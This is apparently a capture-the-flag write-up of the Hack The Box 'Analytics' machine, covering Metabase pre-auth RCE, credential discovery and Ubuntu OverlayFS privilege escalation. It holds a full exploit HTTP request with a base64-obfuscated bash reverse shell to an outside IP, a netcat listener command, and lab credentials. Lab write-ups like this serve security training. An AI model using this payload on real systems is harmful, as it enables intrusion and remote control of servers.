#  Analytics HTB Machine: Easy 

__________________________________________

## WEB PAGE

login --> data.analytical.htb
The link open a login page with a *Metabase* service

Checking online seems that this service is vulnerable.
Source: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/

Before exploiting we need some information to be gathered from the API.

data.analytical.htb/api/session/properties
setup-token	"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"

## Reverse Shell

This Payload should get the reverse shell (but it does not):

```bash
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Content-Type: application/json
Content-Length: 812

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjExMS81NTU0IDA+JjE=}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

In Kali:

```bash
nc -nlvp 5554
```

We need to go with the MSF exploit
## Privesc to User

With Linpeas.sh we find:
META_USER=metalytics
META_PASS=An4lytics_ds20223#

## Privesc to Root

```bash
cat /etc/os-release 
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
```
It is vulnerable to CVE-2021-3493
Ubuntu OverlayFS Local Privesc

Exploit here: https://github.com/briskets/CVE-2021-3493
Compile in your machine first and then upload into machine.

Root! Bye
